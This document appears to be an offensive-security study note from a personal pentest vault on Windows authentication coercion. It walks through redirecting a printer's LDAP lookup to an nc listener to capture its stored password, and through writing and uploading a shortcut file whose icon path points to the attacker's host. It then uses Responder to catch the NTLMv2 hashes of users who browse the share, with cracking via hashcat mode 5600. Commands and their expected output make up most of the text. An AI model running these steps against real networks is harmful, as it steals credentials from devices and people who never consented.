---
type: technique
platform: windows
status: working
fluency: guided
source: thm
updated: 2026-09-17
---

# Authentication Coercion

Stop guessing credentials and make something send you one instead. A device holds a password so it can query the directory, a person walks past a folder with their session already open — in both cases the credential is in motion and you only have to be standing where it lands. This is the road in when every password you sprayed came back empty.

## Making a device hand over its stored directory password

**Why now** — the domain has a printer, a scanner or a multifunction device with a web panel, and no password you tried on a human account worked. That device holds a credential you have never seen, and unlike a person it will hand it over on request.

Why the credential is there at all: a device that lets someone type a colleague's name on its panel and scan a document to them has to look that colleague up somewhere, and that somewhere is the domain's directory. So the device stores an account name and a password and uses them to sign in to the directory each time. The panel shows that account name in plain text and the password as a row of dots — but the dots are a display choice, and the stored value behind them is intact and unencrypted.

The attack redirects the lookup. You change the directory server address in the device's configuration to your own machine, press the button that tests the connection, and the device signs in to you, using the password it has held for years. Three things make it work, and all three are configuration rather than software flaws: the panel is often still on its factory password, the account is often far more privileged than a directory lookup needs, and the sign-in is often unencrypted because nobody turned encryption on.

```bash
nc -lvnp 3489
```

- `-l` → listen rather than connect.
- `-v` → verbose, and the one that is easy to omit. Without it a connection arrives, the credential arrives with it, and your terminal prints nothing to tell you a connection ever happened — so you press the test button again, and again, reading silence as failure.
- `-n` → never resolve addresses to names, so the connecting device is reported as an address and the listener does not pause on a name lookup.
- `-p 3489` → the port. It has to match what you typed into the device's configuration, and it has to be one you can bind: anything below 1024 needs root, and on a machine already running its own directory service the standard port 389 is taken, which is the usual reason for a high port here.

**What you will see**

- **Found** — a connection line, then a short burst of mostly unreadable bytes with two legible strings inside it: a full account path in the directory and, immediately after it, the password. Unencrypted directory sign-in sends both as plain text inside a binary envelope, which is why a listener that understands nothing at all is enough to read them.
- **Empty** — a connection arrives and no readable text comes with it. The device is speaking encrypted directory protocol, or negotiating a challenge-response sign-in instead of a plain one, and neither of those gives up a password to a passive listener. Then you need a rogue directory server that can answer the negotiation.
- **Error** — no connection at all after the test button. Either the address you typed into the device is not the one it can reach you on, or the configuration was not saved before the test, or the device refuses a nonstandard port and silently uses its own default.
- **Noise** — some devices test the connection by reaching the port and closing it without signing in, so a connection with no payload is a reachability answer, not a failure of the whole attack. Check whether the panel offers a separate authentication test.

**Then** — the account name and password go to [[AD-Authentication]] to find out what they open. Verify before celebrating: this class of account is frequently disabled after an audit and left configured on the device, so a valid-looking capture can be a dead credential. It sprays anyway — the password itself may be reused on a live account, which is [[Password-Spraying]] with a list of one.

> [!important] The panel's password field and the device's memory are different things
> A masked field does not mean the value is gone, and a field you cannot read does not mean a field the device cannot send. You are not extracting the password from the browser — you are asking the device to use it, at an address you chose.

## Making a person hand over their hash

**Why now** — you have a credential that can write to a file share, or you found a share open to everyone, and you want something better than the account you already hold. Anyone who opens that folder in a file browser is a candidate, and they do not have to click on anything.

Why it fires without a click: a file browser draws icons for the files in a folder as soon as the folder is opened. A shortcut file is allowed to say where its icon lives, and that location may be on another machine — written as two backslashes, a host, and a path. So the moment the folder is drawn, the machine connects to that host to fetch a picture, and because the file-sharing protocol authenticates before it does anything else, it signs in first, on behalf of whoever is looking. That sign-in is what you are collecting.

```bash
cat > @Shortcut.url << 'EOF'
[InternetShortcut]
URL=http://domain.local
WorkingDirectory=share
IconFile=\\<your ip>\share\icon.ico
IconIndex=1
EOF
```

- the quotes around `'EOF'` → the one that is easy to omit, and omitting it destroys the attack silently. Unquoted, the shell processes what it reads and turns each pair of backslashes into one, so the icon path becomes a single-backslash string that is not a network path at all. The file is created, the upload succeeds, the folder gets opened, and nothing ever connects to you.
- `IconFile` → the only line that matters. The other three are there so the file is a well-formed shortcut; the address in `URL` is never fetched by anyone and can be anything.
- the leading `@` in the filename → sorts the file to the top of the folder listing, so it is among the first icons drawn rather than one that needs scrolling to. A file below the fold is a file whose icon is never requested.

**What you will see**

- **Found** — nothing, locally. This step produces a file, and the evidence arrives in the listener in the next section.
- **Empty** — not applicable; the file is either written or the shell errored.
- **Error** — `cat` reporting no such file or directory means the path you are writing into does not exist. A second heredoc marker inside the content would end it early, which is the only way this command truncates.
- **Noise** — a file that looks right on screen can still carry single backslashes. Check with `cat -A @Shortcut.url` before uploading, and expect to see the doubled backslashes intact.

**Then** — upload it and wait. Older versions of this trick used two other file types for the same purpose, and current Windows no longer follows the icon path in either of them, which is why the shortcut file is the one written here — treat that as a statement about patch level rather than a law, and keep the alternatives in mind against an old host.

```bash
smbclient //server.domain.local/share -U 'DOMAIN\user%Password123!'
```

- `//server/share` with forward slashes → this client's own spelling, even though the path inside the shortcut file uses backslashes. They are two different conventions in two different places and mixing them up is a five-minute mistake.
- `-U 'DOMAIN\user%password'` → domain, user, then the password after a percent sign. Quote the whole thing: the backslash, the percent and any symbol in the password are all shell characters, and an unquoted one hands the client something you did not type.
- once connected, `put @Shortcut.url` uploads it under the same name. Unlike the file transfer protocol's version of this command, one argument is correct here — this client reuses the local name rather than sending the whole local path as the remote name, which is the failure documented in [[21-FTP]].

**What you will see**

- **Found** — a prompt, then a transfer line with a rate. `dir` shows the file at the top of the listing.
- **Empty** — a prompt with `dir` showing an empty share is fine; you are writing, not reading.
- **Error** — an access-denied answer on the upload while the connection succeeded means the share is readable and not writable, which ends this route on this share. A logon failure is the credential.
- **Noise** — a successful upload proves you can write, and proves nothing about whether anyone ever opens this folder. A share full of documents dated last week is a share with visitors; a share full of nothing is a trap that never springs.

**Then** — the listener in the next section is what turns a visitor into a credential, and it has to be running before the first visitor arrives.

## Catching what comes back

**Why now** — a device is about to sign in to you, or a person is about to, and the listener has to speak enough of the protocol to complete the exchange and record it.

```bash
sudo responder -I tun0
```

- `-I tun0` → the interface to listen on, and the one that is easy to get wrong rather than easy to omit: the tool refuses to start without it, but naming your ordinary network interface instead of the tunnel you reached the target through means it listens where nothing will ever arrive, and it reports itself as running perfectly while doing so.
- `sudo` → the tool binds the file-sharing port and several others below 1024. Without it the start fails on a permission error that names a port, which reads as the port being taken rather than as your privileges.
- the port conflict that costs the most time: a machine already running its own file-sharing service occupies that port, so the tool cannot bind it, and the one thing you needed to catch is the one thing it cannot catch. Stop that service before starting the listener.

> [!warning] This tool answers questions it was not asked, by default
> Beyond listening, it replies to the local name-lookup broadcasts that Windows machines send when ordinary name resolution fails — claiming to be whatever host was asked for, so that traffic meant for a mistyped name comes to you instead. That is active interference with a production network, not passive collection, and on a real engagement it needs to be in scope in writing. Analysis mode listens and answers nothing when you want the safe version.

**What you will see**

- **Found** — a block naming the protocol, the address that connected, the domain and account of whoever was browsing, and a long string beginning with that account name. That string is a response, not a password and not a stored hash — the value in it is a signature made with the account's password over a random challenge the server invented, so it is different every time and there is nothing in it to replay.
- **Empty** — the tool running and printing only its startup banner means nobody has opened the folder, or the icon path in the file collapsed to a single backslash, or you are listening on the wrong interface. Check the file first; it is the cheapest of the three to rule out.
- **Error** — a startup failure naming a port is the file-sharing service still running locally. A failure naming the interface is a name that does not exist on this machine, which `ip a` settles.
- **Noise** — the same account arriving repeatedly is one person's file browser redrawing the folder, not several victims. Keep one copy of each distinct account; the rest add nothing, because each response is a fresh signature over a fresh challenge and they do not combine.

**Then** — what you caught decides where it goes, and the two roads in this note end in different places. The device's password is plain text and can be used immediately, at [[AD-Authentication]]. The person's response cannot be used at all until it is cracked, at [[Hash-Cracking]] with mode `5600`, and until then it is not a credential in any sense. That distinction is the whole reason [[AD-Authentication]] opens with a table of what each captured string can and cannot do.

## Reading the output

Both halves of this note exploit the same design decision, which is worth stating once: on a Windows network, authentication is automatic and silent. A machine reaching for a file does not ask its user whether to sign in — it signs in with whatever session is already open, because that is what makes a domain usable. So the moment you control *where* something reaches, you control *who it authenticates to*, and neither the device operator nor the person browsing the share has done anything wrong or even noticeable.

The difference between the two halves is what arrives. A device sends a stored password, because it has to keep one to work unattended, and a stored password is reusable everywhere. A person sends a signature over a challenge, because they typed their password once this morning and the operating system has never stored it in a form it could send. That is why the coercion of a device is worth more per hit and the coercion of a share is worth more per opportunity — one gives you a working credential immediately, the other gives you a cracking job whose success depends on the password being in a wordlist.

## Rarely — worth one command, not worth a step

- The same idea aimed at servers rather than people: several Windows services can be asked, over the network, to connect somewhere of your choosing, and a machine that connects to you authenticates as itself. Those are the named coercion techniques the field talks about, they target controllers rather than users, and nothing in this vault covers them yet.
- Relaying instead of cracking: a captured response cannot be replayed to the machine that issued the challenge, but it can be forwarded to a *different* machine while it is still fresh, which turns a hash you would never crack into a session. It depends on the target not requiring signed connections.
- A rogue directory server, for the device that refuses to sign in to a plain listener. It answers the negotiation properly and records the sign-in, and it is the fallback for the empty case in the first section.

## Next

- [[Hash-Cracking]] — mode `5600`, and what an exhausted run against a captured response is actually evidence of
- [[AD-Authentication]] — which of the two captures authenticates as it stands, and which does not
- [[445-SMB]] — the share enumeration that finds a writable folder in the first place

## Gaps

- The rogue directory server is named in two places and written nowhere, so the encrypted-device case currently ends in a dead end.
- Relaying is a paragraph and should be a note: it is the difference between a hash that never cracks and a session, and the signing requirement that defeats it is not explained anywhere here.
- Nothing on the coercion techniques that target servers, which is where this subject actually leads.
- No treatment of how long a captured response stays useful, which matters only for relaying and is exactly what makes relaying urgent.
- The claim about which shortcut file types current Windows still follows is a patch-level fact with no date attached and no method given for testing it on the host in front of you.
